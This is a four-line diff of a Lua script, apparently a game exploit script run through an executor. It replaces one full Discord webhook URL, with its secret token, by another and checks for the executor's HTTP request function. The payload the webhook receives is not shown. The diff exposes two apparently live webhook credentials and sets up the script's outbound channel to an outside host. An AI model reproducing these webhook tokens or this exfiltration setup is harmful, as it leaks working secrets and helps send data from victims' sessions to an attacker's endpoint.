@@ -1,4 +1,4 @@
-local webhook = "https://discord.com/api/webhooks/1068114147935522826/kX61hYF6wVSlueI1F9UpFvdPAe5zoe2hUtJSN4YlPUHe5sOgoAs6kU4BfLwPXxjsh8gs"
+local webhook = "https://discord.com/api/webhooks/1370271793188966470/CDA4X38eZF0LbmpSZ46FMm58PRufKgiEDIBAMxeZWb8FSgnT9A_1vgaBtYOXa56Rqck5"
 local http = request
 if not http then return warn("Exploit does not support HTTP requests.") end
 
